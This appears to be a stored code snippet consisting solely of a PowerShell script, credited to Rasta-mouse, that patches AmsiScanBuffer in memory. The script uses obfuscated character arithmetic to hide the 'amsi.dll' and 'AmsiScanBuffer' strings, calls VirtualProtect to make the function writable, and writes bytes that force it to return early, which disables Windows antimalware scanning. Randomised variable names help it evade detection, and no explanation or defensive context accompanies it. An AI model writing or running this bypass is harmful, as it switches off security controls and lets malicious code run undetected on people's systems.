---
id: 7b9a71d2-4d6f-4ecd-8ca3-3091331c37ff
type: code
language: Powershell
verified: false
created_at: '2023-01-10T04:28:58.963034+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 7b9a71d2

**Language**: Powershell

```powershell
#Rasta-mouses Amsi-Scan-Buffer patch \n
$wdzlz = @"
using System;
using System.Runtime.InteropServices;
public class wdzlz {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr soredp, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $wdzlz

$zihzuoo = [wdzlz]::LoadLibrary("$([ChAr](97)+[chAr](109*7/7)+[ChAR](115)+[chAr](70+35)+[ChAr](26+20)+[chAR](41+59)+[cHAr](108)+[ChaR]([bYTE]0x6c))")
$fvuixt = [wdzlz]::GetProcAddress($zihzuoo, "$([cHAR]([bytE]0x41)+[CHAR](109*63/63)+[cHar]([ByTe]0x73)+[cHaR](105*32/32)+[CHaR]([ByTE]0x53)+[CHaR]([bYTE]0x63)+[char]([bYTE]0x61)+[cHaR](17+93)+[ChaR]([ByTe]0x42)+[cHar]([bYTe]0x75)+[ChaR](40+62)+[char]([BYTe]0x66)+[chAR](101)+[cHar]([byte]0x72))")
$p = 0
[wdzlz]::VirtualProtect($fvuixt, [uint32]5, 0x40, [ref]$p)
$dtga = "0xB8"
$gvqh = "0x57"
$qqco = "0x00"
$vckd = "0x07"
$vxqg = "0x80"
$xern = "0xC3"
$eenuc = [Byte[]] ($dtga,$gvqh,$qqco,$vckd,+$vxqg,+$xern)
[System.Runtime.InteropServices.Marshal]::Copy($eenuc, 0, $fvuixt, 6)
```
